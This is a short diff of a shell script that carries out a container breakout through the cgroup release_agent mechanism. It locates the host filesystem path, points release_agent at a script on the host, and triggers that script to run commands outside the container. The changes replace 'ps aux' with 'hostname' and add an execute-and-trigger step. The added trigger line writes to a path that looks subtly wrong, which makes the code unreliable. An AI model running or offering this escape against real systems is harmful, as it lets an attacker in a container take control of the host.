@@ -7,4 +7,7 @@ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 # Define path in release_agent which execute when all a cgroup tasks are done.
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /cmd
-echo "ps aux > $host_path/output" >> /cmd
+echo "hostname > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgroup.procs"
+cat /output
